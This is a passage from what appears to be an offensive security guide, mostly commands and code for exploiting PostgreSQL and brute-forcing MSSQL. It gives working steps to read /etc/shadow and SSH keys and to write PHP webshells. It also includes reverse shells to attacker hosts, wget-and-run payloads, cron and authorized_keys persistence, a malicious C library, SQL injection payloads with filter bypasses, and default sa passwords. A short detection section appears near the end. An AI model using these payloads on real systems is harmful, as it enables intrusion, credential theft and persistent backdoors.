psql -h target_ip -U postgres -d postgres

# Check if user is superuser
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;

# Read /etc/passwd
DROP TABLE IF EXISTS temp_data;
CREATE TABLE temp_data(content text);
COPY temp_data FROM '/etc/passwd';
SELECT * FROM temp_data;

# Read arbitrary files
COPY temp_data FROM '/etc/shadow';
SELECT * FROM temp_data;

# Read configuration files
COPY temp_data FROM '/etc/postgresql/12/main/pg_hba.conf';
SELECT * FROM temp_data;

# Read application configuration
COPY temp_data FROM '/var/www/html/config.php';
SELECT * FROM temp_data;

# Read SSH keys
COPY temp_data FROM '/home/user/.ssh/id_rsa';
SELECT * FROM temp_data;

# Cleanup
DROP TABLE temp_data;
```

**File Write Exploitation**

```bash
# Connect to database
psql -h target_ip -U postgres -d postgres

# Create table with malicious content
CREATE TABLE shell_data(content text);
INSERT INTO shell_data VALUES ('<?php system($_GET["cmd"]); ?>');

# Write webshell to accessible directory
COPY shell_data TO '/var/www/html/shell.php';

# Access webshell
curl http://target_ip/shell.php?cmd=id

# Write SSH authorized_keys
CREATE TABLE ssh_keys(content text);
INSERT INTO ssh_keys VALUES ('ssh-rsa AAAAB3NzaC... attacker@kali');
COPY ssh_keys TO '/var/lib/postgresql/.ssh/authorized_keys';

# Cleanup
DROP TABLE shell_data;
DROP TABLE ssh_keys;
```

**Advanced File Operations**

```bash
# Read file with PROGRAM option (PostgreSQL 9.3+)
COPY temp_data FROM PROGRAM 'cat /etc/passwd';
SELECT * FROM temp_data;

# Execute commands and capture output
COPY temp_data FROM PROGRAM 'id';
SELECT * FROM temp_data;

COPY temp_data FROM PROGRAM 'whoami';
SELECT * FROM temp_data;

COPY temp_data FROM PROGRAM 'uname -a';
SELECT * FROM temp_data;

# Network enumeration
COPY temp_data FROM PROGRAM 'ifconfig';
SELECT * FROM temp_data;

COPY temp_data FROM PROGRAM 'netstat -antup';
SELECT * FROM temp_data;

# Find SUID binaries
COPY temp_data FROM PROGRAM 'find / -perm -4000 2>/dev/null';
SELECT * FROM temp_data;
```

**Large Object (lo_) Functions for File Access**

```bash
# Alternative file read method using large objects
SELECT lo_import('/etc/passwd', 12345);
SELECT encode(lo_get(12345), 'escape');
SELECT lo_unlink(12345);

# Write file using large objects
SELECT lo_from_bytea(54321, decode('<?php system($_GET["cmd"]); ?>', 'escape'));
SELECT lo_export(54321, '/var/www/html/shell.php');
SELECT lo_unlink(54321);

# Read sensitive files
SELECT lo_import('/etc/shadow', 99999);
SELECT encode(lo_get(99999), 'escape');

# Read application files
SELECT lo_import('/var/www/html/config.php', 88888);
SELECT encode(lo_get(88888), 'escape');
```

### PL/Python/Shell Code Execution

PostgreSQL supports procedural languages including PL/Python and PL/sh (shell) that can execute arbitrary code with database server privileges.

**Enable Procedural Languages**

```bash
# Connect as superuser
psql -h target_ip -U postgres -d postgres

# Check available languages
SELECT lanname FROM pg_language;

# Enable PL/Python (untrusted)
CREATE LANGUAGE plpythonu;

# Enable PL/Perl (untrusted)
CREATE LANGUAGE plperlu;

# Enable PL/sh (if available)
CREATE LANGUAGE plsh;
```

**Code Execution via PL/Python**

```sql
-- Check if plpythonu is available
SELECT lanname FROM pg_language WHERE lanname = 'plpythonu';

-- Create function for command execution
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) 
RETURNS text AS $$
import subprocess
result = subprocess.check_output(cmd, shell=True)
return result.decode('utf-8')
$$ LANGUAGE plpythonu;

-- Execute commands
SELECT exec_cmd('id');
SELECT exec_cmd('whoami');
SELECT exec_cmd('uname -a');
SELECT exec_cmd('cat /etc/passwd');

-- Reverse shell via Python
SELECT exec_cmd('python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''');

-- Cleanup
DROP FUNCTION exec_cmd(text);
```

**Code Execution via PL/Perl**

```sql
-- Create Perl command execution function
CREATE OR REPLACE FUNCTION exec_perl(cmd text) 
RETURNS text AS $$
  return `$_[0]`;
$$ LANGUAGE plperlu;

-- Execute commands
SELECT exec_perl('id');
SELECT exec_perl('whoami');
SELECT exec_perl('ls -la /tmp');

-- Reverse shell
SELECT exec_perl('perl -e ''use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};''');

-- Cleanup
DROP FUNCTION exec_perl(text);
```

**Code Execution via COPY FROM PROGRAM**

```bash
# Modern PostgreSQL versions support PROGRAM in COPY
psql -h target_ip -U postgres -d postgres

# Create table for output
CREATE TABLE cmd_output(output text);

# Execute commands
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;

COPY cmd_output FROM PROGRAM 'cat /etc/passwd';
SELECT * FROM cmd_output;

# Establish reverse shell
COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"';

# Download and execute payload
COPY cmd_output FROM PROGRAM 'wget http://attacker_ip/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh';

-- Cleanup
DROP TABLE cmd_output;
```

**Using SECURITY DEFINER for Privilege Escalation**

```sql
-- Create function with elevated privileges
CREATE OR REPLACE FUNCTION priv_exec(cmd text) 
RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode('utf-8')
$$ LANGUAGE plpythonu SECURITY DEFINER;

-- Grant execute to lower privileged user
GRANT EXECUTE ON FUNCTION priv_exec(text) TO public;

-- Now lower privileged users can execute commands with function owner's privileges
SELECT priv_exec('id');
```

**Metasploit PostgreSQL Exploitation**

```bash
# Payload execution via PostgreSQL
msfconsole -q << EOF
use exploit/linux/postgres/postgres_payload
set RHOSTS target_ip
set USERNAME postgres
set PASSWORD postgres
set DATABASE postgres
set LHOST attacker_ip
set LPORT 4444
set payload linux/x64/meterpreter/reverse_tcp
exploit
EOF

# Copy from program execution
msfconsole -q << EOF
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS target_ip
set USERNAME postgres
set PASSWORD postgres
set DATABASE postgres
set LHOST attacker_ip
exploit
EOF
```

---

### SQL Injection in PostgreSQL Context

#### PostgreSQL-Specific SQL Injection Techniques

**Basic PostgreSQL syntax differences:**

```sql
-- Comment styles
SELECT * FROM users WHERE id=1; -- Single line comment
SELECT * FROM users WHERE id=1; /* Multi-line comment */

-- String concatenation
SELECT 'Hello' || ' ' || 'World';  -- PostgreSQL uses ||
SELECT CONCAT('Hello', ' ', 'World');

-- String quotes
SELECT * FROM users WHERE name='admin';  -- Single quotes for strings
SELECT * FROM users WHERE name=$$admin$$;  -- Dollar quoting (bypass filter)
SELECT * FROM users WHERE name=E'admin\x27';  -- Escape sequences
```

**Union-based injection:**

```sql
-- Determine column count
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--  (error = found column count)

-- Union injection
' UNION SELECT NULL,NULL,NULL-- 
' UNION SELECT 1,2,3-- 

-- Extract database information
' UNION SELECT version(),current_database(),current_user-- 
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- 
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- 

-- Extract data
' UNION SELECT NULL,username,password FROM users-- 
' UNION SELECT NULL,username||':'||password,NULL FROM users-- 
```

**Boolean-based blind injection:**

```sql
-- True/False testing
' AND 1=1--  (True - page normal)
' AND 1=2--  (False - page different)

-- Extract database name length
' AND LENGTH(current_database())=5-- 
' AND LENGTH(current_database())>3-- 

-- Character-by-character extraction
' AND SUBSTRING(current_database(),1,1)='p'-- 
' AND ASCII(SUBSTRING(current_database(),1,1))=112-- 

-- Extract version
' AND SUBSTRING(version(),1,10)='PostgreSQL'-- 

-- Table existence check
' AND EXISTS(SELECT * FROM users)-- 
' AND (SELECT COUNT(*) FROM users)>0-- 
```

**Time-based blind injection:**

```sql
-- Basic time delay
'; SELECT pg_sleep(5)-- 
' AND (SELECT pg_sleep(5))--

-- Conditional time delays
' AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- 
' AND (CASE WHEN (current_user='postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- 

-- Extract data with timing
' AND (CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(3) ELSE pg_sleep(0) END)-- 
' AND (CASE WHEN ((SELECT COUNT(*) FROM users WHERE username='admin')>0) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- 

-- Using generate_series for delays
' AND 1=(SELECT COUNT(*) FROM generate_series(1,5000000))-- 
```

**Stacked queries (if supported):**

```sql
-- Multiple statements
'; DROP TABLE users--
'; CREATE TABLE backdoor(cmd TEXT)--
'; INSERT INTO backdoor VALUES('test')--

-- Check if stacked queries work
'; SELECT pg_sleep(5); SELECT 1-- 
```

**Error-based injection:**

```sql
-- Generate errors to extract data
' AND 1=CAST(version() AS INT)-- 
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- 

-- Using XMLAGG for error messages
' AND 1=CAST((SELECT XMLAGG(column_name) FROM information_schema.columns WHERE table_name='users') AS INT)-- 

-- Array index error
' AND 1=(SELECT 1 FROM (SELECT unnest(ARRAY[1,2,3])) AS t WHERE t>version())-- 
```

#### Information Schema Enumeration

**Database and schema enumeration:**

```sql
-- Current database and user
SELECT current_database(), current_user, session_user;
SELECT version();
SELECT inet_server_addr(), inet_server_port();

-- List all databases
SELECT datname FROM pg_database;

-- List schemas
SELECT schema_name FROM information_schema.schemata;
SELECT nspname FROM pg_namespace;

-- List tables
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema');
SELECT schemaname,tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');

-- List columns for specific table
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users';

-- List all columns (useful for finding interesting data)
SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%';
```

**User and privilege enumeration:**

```sql
-- List users/roles
SELECT usename,usecreatedb,usesuper FROM pg_user;
SELECT rolname,rolsuper,rolcreatedb FROM pg_roles;

-- Current user privileges
SELECT * FROM information_schema.table_privileges WHERE grantee=current_user;

-- Check if current user is superuser
SELECT usesuper FROM pg_user WHERE usename=current_user;
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;

-- List database permissions
SELECT datname,datacl FROM pg_database;
```

**Function and procedure enumeration:**

```sql
-- List user-defined functions
SELECT routine_name,routine_type FROM information_schema.routines WHERE routine_schema NOT IN ('pg_catalog','information_schema');

-- List functions with SECURITY DEFINER (run with creator privileges)
SELECT proname,proargtypes,prosrc FROM pg_proc WHERE prosecdef=true;

-- List installed extensions
SELECT * FROM pg_available_extensions;
SELECT * FROM pg_extension;
```

#### Filter Bypass Techniques

**Case manipulation:**

```sql
-- Mixed case
' UnIoN SeLeCt NULL,NULL-- 
' uNiOn aLl sElEcT NULL-- 
```

**Comment insertion:**

```sql
-- Inline comments
' UNION/**/SELECT/**/NULL-- 
' UNION/*comment*/SELECT/**/NULL,NULL-- 
' UN/**/ION SE/**/LECT-- 
```

**Dollar quoting (bypass quote filters):**

```sql
-- Standard dollar quoting
SELECT $$admin$$;
SELECT $tag$admin$tag$;

-- Injection using dollar quotes
' OR username=$admin$admin$admin$ AND '1'='1
```

**Encoded strings:**

```sql
-- Hexadecimal encoding
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);  -- 'admin'
SELECT E'\x61\x64\x6d\x69\x6e';  -- 'admin'

-- Unicode escapes
SELECT U&'\0061\0064\006D\0069\006E';  -- 'admin'

-- Octal encoding
SELECT E'\141\144\155\151\156';  -- 'admin'
```

**Alternative operators:**

```sql
-- String comparison alternatives
username='admin'
username LIKE 'admin'
username SIMILAR TO 'admin'
username ~ '^admin$'  -- Regex match
username !~ '^(?!admin$)'

-- Logical operators
AND = &&  [Inference: Not standard PostgreSQL, use AND]
OR can be replaced with ||  [Clarification: || is concatenation, OR remains OR]

-- NULL handling
username IS NOT NULL
COALESCE(username,'') != ''
```

**Whitespace alternatives:**

```sql
-- Tab, newline, form feed
'UNION%09SELECT%09NULL-- 
'UNION%0ASELECT%0ANULL-- 
'UNION%0CSELECT%0CNULL-- 

-- Multiple spaces
'UNION    SELECT    NULL-- 
```

#### Advanced PostgreSQL Injection Techniques

**Array manipulation:**

```sql
-- Extract data using arrays
' UNION SELECT NULL,ARRAY_TO_STRING(ARRAY_AGG(username||':'||password),','),NULL FROM users-- 

-- Access array elements
SELECT (ARRAY['one','two','three'])[1];  -- Returns 'one'
```

**JSON/JSONB functions:**

```sql
-- Extract JSON data
SELECT data->>'username' FROM user_profiles;
SELECT data->'credentials'->>'password' FROM user_profiles;

-- Injection in JSON context
' UNION SELECT NULL,jsonb_object_agg(username,password)::text,NULL FROM users-- 
```

**Large object manipulation:**

```sql
-- Create large object (if permissions allow)
SELECT lo_create(12345);
SELECT lo_put(12345, 0, 'malicious content');
SELECT lo_export(12345, '/tmp/malicious.txt');

-- Read files via large objects
SELECT lo_import('/etc/passwd', 12346);
SELECT CAST(lo_get(12346) AS text);
```

**XML functions:**

```sql
-- Extract data via XML
' UNION SELECT NULL,XMLAGG(username||':'||password)::text,NULL FROM users-- 
' UNION SELECT NULL,query_to_xml('SELECT * FROM users',true,false,'')::text,NULL-- 
```

### Superuser Exploitation

#### Identifying Superuser Access

**Check current privileges:**

```sql
-- Verify superuser status
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user;

-- Check effective privileges
SELECT has_database_privilege(current_user, 'postgres', 'CREATE');
SELECT has_schema_privilege(current_user, 'public', 'CREATE');

-- List superuser accounts
SELECT usename FROM pg_user WHERE usesuper=true;
```

**Privilege escalation checks [Inference: success depends on misconfigurations]:**

```sql
-- Check for SECURITY DEFINER functions owned by superusers
SELECT proname,prosrc,proowner FROM pg_proc 
WHERE prosecdef=true AND proowner IN (SELECT usesysid FROM pg_user WHERE usesuper=true);

-- Check for writable functions
SELECT routine_name FROM information_schema.routines 
WHERE routine_schema='public' AND security_type='DEFINER';

-- Identify ALTER USER permission
SELECT rolname FROM pg_roles WHERE rolcreaterole=true;
```

#### File System Access (Superuser Required)

**Reading files:**

```sql
-- Read file contents (requires superuser)
CREATE TABLE file_content(data TEXT);
COPY file_content FROM '/etc/passwd';
SELECT * FROM file_content;

-- Alternative: pg_read_file (PostgreSQL 9.1+)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 1000);  -- Read first 1000 bytes

-- Read binary files
SELECT pg_read_binary_file('/etc/shadow');
SELECT ENCODE(pg_read_binary_file('/root/.ssh/id_rsa'), 'base64');

-- List directory contents
SELECT pg_ls_dir('/etc');
SELECT pg_ls_dir('/var/www/html');

-- Get file metadata
SELECT * FROM pg_stat_file('/etc/passwd');
```

**Writing files:**

```sql
-- Write to file using COPY
CREATE TABLE shell_data(cmd TEXT);
INSERT INTO shell_data VALUES('<?php system($_GET["cmd"]); ?>');
COPY shell_data(cmd) TO '/var/www/html/shell.php';

-- Write multiple lines
COPY (SELECT '#!/bin/bash' UNION SELECT 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1') TO '/tmp/shell.sh';

-- Write with specific format
COPY (SELECT 'data') TO '/tmp/output.txt' WITH (FORMAT TEXT);
```

**File operations via large objects:**

```sql
-- Import file to large object
SELECT lo_import('/etc/passwd', 1337);

-- Export large object to file
SELECT lo_export(1337, '/tmp/passwd_copy');

-- Read large object content
SELECT ENCODE(lo_get(1337), 'escape');

-- Delete large object
SELECT lo_unlink(1337);
```

#### Command Execution as Superuser

**COPY PROGRAM (PostgreSQL 9.3+, requires superuser):**

```sql
-- Execute system commands
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(data TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell
COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';

-- Multiple commands
COPY cmd_output FROM PROGRAM 'whoami; id; uname -a';

-- File system reconnaissance
COPY cmd_output FROM PROGRAM 'ls -la /home';
COPY cmd_output FROM PROGRAM 'find / -name "*.conf" 2>/dev/null';

-- Credential hunting
COPY cmd_output FROM PROGRAM 'cat /home/*/.bash_history';
COPY cmd_output FROM PROGRAM 'grep -r "password" /var/www/html 2>/dev/null';
```

**Write web shell:**

```sql
-- PHP web shell
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/s.php';
COPY (SELECT '<?php eval($_POST["x"]); ?>') TO '/var/www/html/backdoor.php';

-- Verify web shell placement
SELECT pg_read_file('/var/www/html/s.php');

-- Access via: http://target.com/s.php?c=id
```

**SSH key persistence:**

```sql
-- Write SSH public key
COPY (SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...') TO '/root/.ssh/authorized_keys';
COPY (SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...') TO '/home/postgres/.ssh/authorized_keys';

-- Read existing keys
SELECT pg_read_file('/home/postgres/.ssh/id_rsa');
SELECT pg_read_file('/root/.ssh/id_rsa');
```

**Cron job installation:**

```sql
-- Add malicious cron job
COPY (SELECT '*/5 * * * * /tmp/reverse.sh') TO '/etc/cron.d/persistence';
COPY (SELECT '#!/bin/bash' UNION SELECT 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1') TO '/tmp/reverse.sh';

-- Verify cron job
SELECT pg_read_file('/etc/cron.d/persistence');
```

#### PostgreSQL Configuration Exploitation

**Modify postgresql.conf:**

```sql
-- Read current configuration
SELECT name,setting FROM pg_settings WHERE name LIKE '%log%';
SELECT name,setting FROM pg_settings WHERE name LIKE '%ssl%';

-- Modify settings (some require reload/restart)
ALTER SYSTEM SET log_statement = 'all';  -- Log all SQL statements
ALTER SYSTEM SET shared_preload_libraries = 'pg_stat_statements';

-- Reload configuration
SELECT pg_reload_conf();

-- View config file location
SHOW config_file;
SELECT pg_read_file(current_setting('config_file'));
```

**pg_hba.conf manipulation [Caution: Can break authentication]:**

```sql
-- Locate pg_hba.conf
SHOW hba_file;

-- Read current rules
SELECT pg_read_file(current_setting('hba_file'));

-- Write permissive rules (allows remote connections without password)
-- [Unverified: Success depends on file permissions and PostgreSQL restart]
COPY (SELECT 'host all all 0.0.0.0/0 trust') TO '/etc/postgresql/13/main/pg_hba.conf';
```

### Extension Loading for Code Execution

#### Identifying Extension Capabilities

**Enumerate installed extensions:**

```sql
-- List available extensions
SELECT * FROM pg_available_extensions ORDER BY name;

-- List installed extensions
SELECT extname,extversion FROM pg_extension;

-- Check extension installation permissions
SELECT has_database_privilege(current_user, current_database(), 'CREATE');

-- Identify extension directory
SHOW dynamic_library_path;
SELECT pg_config WHERE name = 'PKGLIBDIR';
```

**Common exploitable extensions:**

```sql
-- plpythonu (untrusted Python)
-- plperlu (untrusted Perl)
-- plsql (untrusted SQL)
-- adminpack (admin functions)
-- dblink (remote database access)
```

#### Language Extensions for Code Execution

**PL/Python (plpythonu - untrusted):**

```sql
-- Install extension (requires superuser or CREATE privilege)
CREATE EXTENSION plpythonu;

-- Basic command execution
CREATE OR REPLACE FUNCTION exec_shell(cmd TEXT) RETURNS TEXT AS $$
import subprocess
result = subprocess.check_output(cmd, shell=True)
return result.decode('utf-8')
$$ LANGUAGE plpythonu;

SELECT exec_shell('id');
SELECT exec_shell('whoami');

-- Reverse shell
CREATE OR REPLACE FUNCTION py_reverse_shell() RETURNS void AS $$
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
$$ LANGUAGE plpythonu;

SELECT py_reverse_shell();

-- File operations
CREATE OR REPLACE FUNCTION py_read_file(filepath TEXT) RETURNS TEXT AS $$
with open(filepath, 'r') as f:
    return f.read()
$$ LANGUAGE plpythonu;

SELECT py_read_file('/etc/passwd');

-- Write file
CREATE OR REPLACE FUNCTION py_write_file(filepath TEXT, content TEXT) RETURNS TEXT AS $$
with open(filepath, 'w') as f:
    f.write(content)
return "File written"
$$ LANGUAGE plpythonu;

SELECT py_write_file('/tmp/test.txt', 'malicious content');
```

**PL/Perl (plperlu - untrusted):**

```sql
-- Install extension
CREATE EXTENSION plperlu;

-- Command execution
CREATE OR REPLACE FUNCTION perl_exec(cmd TEXT) RETURNS TEXT AS $$
my $output = `$_[0]`;
return $output;
$$ LANGUAGE plperlu;

SELECT perl_exec('id');

-- Reverse shell
CREATE OR REPLACE FUNCTION perl_reverse_shell() RETURNS void AS $$
use Socket;
$i="10.10.14.5";
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/bash -i");
};
$$ LANGUAGE plperlu;

SELECT perl_reverse_shell();

-- File read
CREATE OR REPLACE FUNCTION perl_read_file(filepath TEXT) RETURNS TEXT AS $$
open(F, $_[0]) or die "Cannot open file";
my $content = do { local $/; <F> };
close(F);
return $content;
$$ LANGUAGE plperlu;

SELECT perl_read_file('/etc/passwd');
```

**PL/sh (requires custom extension - example concept):**

```sql
-- [Unverified: Not a standard PostgreSQL extension]
-- Concept demonstration of shell language extension
CREATE OR REPLACE FUNCTION shell(cmd TEXT) RETURNS TEXT AS $$
#!/bin/bash
eval "$1"
$$ LANGUAGE plsh;

SELECT shell('id');
```

#### Custom Shared Library Loading

**Compile malicious shared library:**

```c
// malicious.c - PostgreSQL loadable module
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);

Datum pg_exec(PG_FUNCTION_ARGS) {
    char *cmd = TextDatumGetCString(PG_GETARG_DATUM(0));
    system(cmd);
    PG_RETURN_VOID();
}
```

**Compilation and deployment:**

```bash
# On attacker machine (matching target PostgreSQL version)
# Install PostgreSQL development headers
apt-get install postgresql-server-dev-13

# Compile shared library
gcc -I$(pg_config --includedir-server) -fPIC -c malicious.c
gcc -shared -o malicious.so malicious.o

# Transfer to target and place in extension directory
# Typical locations:
# /usr/lib/postgresql/13/lib/
# /usr/local/pgsql/lib/
```

**Load and execute:**

```sql
-- Create function wrapper
CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS void AS '/tmp/malicious.so', 'pg_exec' LANGUAGE C STRICT;

-- Execute commands
SELECT exec_cmd('id');
SELECT exec_cmd('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"');
```

#### dblink Extension Exploitation

**Install and configure dblink:**

```sql
-- Install extension
CREATE EXTENSION dblink;

-- Connect to external database (requires network access)
SELECT dblink_connect('host=10.10.14.5 user=postgres password=password dbname=postgres');

-- Execute queries on remote database
SELECT * FROM dblink('host=10.10.14.5 user=postgres password=password dbname=postgres',
                     'SELECT version()') AS t(version TEXT);

-- Local connection with elevated privileges [Inference: requires trust authentication]
SELECT dblink_connect('host=localhost dbname=postgres user=postgres');
SELECT * FROM dblink('SELECT * FROM pg_shadow') AS t(usename TEXT, passwd TEXT);
```

**dblink for SSRF and port scanning:**

```sql
-- Port scanning via connection attempts
SELECT dblink_connect('host=192.168.1.1 port=22');  -- SSH
SELECT dblink_connect('host=192.168.1.1 port=80');  -- HTTP
SELECT dblink_connect('host=192.168.1.1 port=3306');  -- MySQL

-- Time-based inference
SELECT * FROM dblink('host=internal-server.local dbname=postgres user=postgres', 
                     'SELECT pg_sleep(5)') AS t(result TEXT);
```

#### adminpack Extension

**Administrative functions:**

```sql
-- Install adminpack
CREATE EXTENSION adminpack;

-- File operations (superuser required)
SELECT pg_file_write('test.txt', 'content', false);
SELECT pg_file_rename('/tmp/test.txt', '/tmp/renamed.txt');
SELECT pg_file_unlink('/tmp/renamed.txt');

-- Read server logs
SELECT pg_read_file('postgresql-13-main.log', 0, 1000);
SELECT pg_logfile_rotate();
```

#### pg_cron Extension (Scheduled Execution)

```sql
-- Install pg_cron
CREATE EXTENSION pg_cron;

-- Schedule command execution [Inference: Requires COPY PROGRAM or similar capability]
SELECT cron.schedule('persist', '*/5 * * * *', 
    $$COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'$$);

-- List scheduled jobs
SELECT * FROM cron.job;

-- Unscheduled job
SELECT cron.unschedule(1);
```

#### Extension Installation via SQL Injection

**Multi-statement extension installation:**

```sql
-- Stacked queries to install and exploit extension
'; CREATE EXTENSION plpythonu; CREATE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpythonu; SELECT exec('id')-- 

-- Alternative with plperlu
'; CREATE EXTENSION plperlu; CREATE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $$ return `$_[0]` $$ LANGUAGE plperlu; SELECT exec('whoami')-- 
```

**Time-delayed extension exploitation:**

```sql
-- If immediate execution is detected, use stored procedure
'; CREATE EXTENSION plpythonu; CREATE OR REPLACE FUNCTION backdoor() RETURNS void AS $$ import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.5",4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["/bin/bash","-i"]) $$ LANGUAGE plpythonu-- 

-- Trigger later via SQL injection
'; SELECT backdoor()-- 
```

#### Detection and Cleanup

**Identify malicious extensions:**

```sql
-- List all functions (look for suspicious ones)
SELECT proname,prosrc,prolang FROM pg_proc WHERE proname NOT LIKE 'pg_%' AND pronamespace::regnamespace::text = 'public';

-- Find functions using untrusted languages
SELECT proname,prolang::regtype FROM pg_proc WHERE prolang IN (SELECT oid FROM pg_language WHERE lanname IN ('plpythonu','plperlu'));

-- List recently created objects
SELECT schemaname,tablename,tableowner FROM pg_tables WHERE schemaname='public';
SELECT proname,proowner FROM pg_proc WHERE procreated > NOW() - INTERVAL '1 day';  
-- [Clarification: pg_proc doesn't have 'procreated' column by default]

-- Check loaded libraries
SELECT * FROM pg_settings WHERE name='shared_preload_libraries';
```

**Remove malicious components:**

```sql
-- Drop functions
DROP FUNCTION IF EXISTS exec_shell(TEXT);
DROP FUNCTION IF EXISTS py_reverse_shell();
DROP FUNCTION IF EXISTS perl_exec(TEXT);

-- Drop extensions
DROP EXTENSION IF EXISTS plpythonu;
DROP EXTENSION IF EXISTS plperlu;

-- Remove shared library
-- Via COPY PROGRAM or manual file deletion
```

---

**Related Critical Topics:**

- **PostgreSQL password hash cracking** - extracting and cracking pg_shadow/pg_authid hashes
- **PostgreSQL privilege escalation techniques** - from low-privilege user to superuser
- **Post-exploitation and lateral movement** - using PostgreSQL access to pivot within infrastructure

---

## MSSQL Exploitation

### Overview of MSSQL Attack Surface

Microsoft SQL Server (MSSQL) typically runs on TCP port 1433 (default instance) or dynamic ports for named instances. Exploitation focuses on authentication bypass, command execution via stored procedures, and privilege escalation through SQL Server features. MSSQL runs under service accounts (often `NT SERVICE\MSSQLSERVER` or domain accounts) which determines post-exploitation privilege levels.

**Critical Context**: MSSQL on Windows integrates deeply with the operating system, allowing attackers to leverage SQL access for OS-level command execution through multiple mechanisms.

### Brute Force MSSQL

#### Reconnaissance First

Before brute forcing, enumerate MSSQL instances and authentication modes:

```bash
# Nmap NSE scripts for MSSQL discovery
nmap -p 1433 --script ms-sql-info <target>
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <target>

# Discover named instances (UDP 1434)
nmap -sU -p 1434 --script ms-sql-discover <target>
```

**[Inference]** Systems with named instances may have non-standard ports that require UDP 1434 enumeration to discover.

#### Brute Force Techniques

**Hydra** - Fast parallel authentication testing:

```bash
# SQL Server authentication brute force
hydra -L users.txt -P passwords.txt <target> mssql

# Single user, password list
hydra -l sa -P /usr/share/wordlists/rockyou.txt <target> mssql

# Add verbosity and timing
hydra -l sa -P passwords.txt -vV -t 4 <target> mssql
```

**Metasploit** - More granular control:

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <target>
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set THREADS 10
run
```

**Nmap NSE** - Lightweight option:

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Brute force only SA account
nmap -p 1433 --script ms-sql-brute --script-args mssql.username=sa,passdb=passwords.txt <target>
```

**CrackMapExec** - Modern multi-protocol tool:

```bash
# MSSQL module
crackmapexec mssql <target> -u users.txt -p passwords.txt

# Single credential test
crackmapexec mssql <target> -u sa -p 'Password123'

# Windows authentication (if domain context)
crackmapexec mssql <target> -u administrator -p 'Password123' -d DOMAIN
```

**Important Considerations**:

- MSSQL may enforce account lockout policies - use slow rates (`-t 1` to `-t 4` threads)
- Windows authentication attempts may trigger domain-wide security alerts
- Failed SQL authentication attempts are logged in SQL Server error logs and Windows Event Logs

### Default Credentials (SA Account)

The `sa` (System Administrator) account is MSSQL's built-in superuser account with `sysadmin` role privileges.

#### Common Default Scenarios

**Default credentials to test**:

```
Username: sa
Passwords:
- (blank/empty password)
- sa
- password
- Password1
- root
- admin
- sql
- [CompanyName]
- [ServerName]
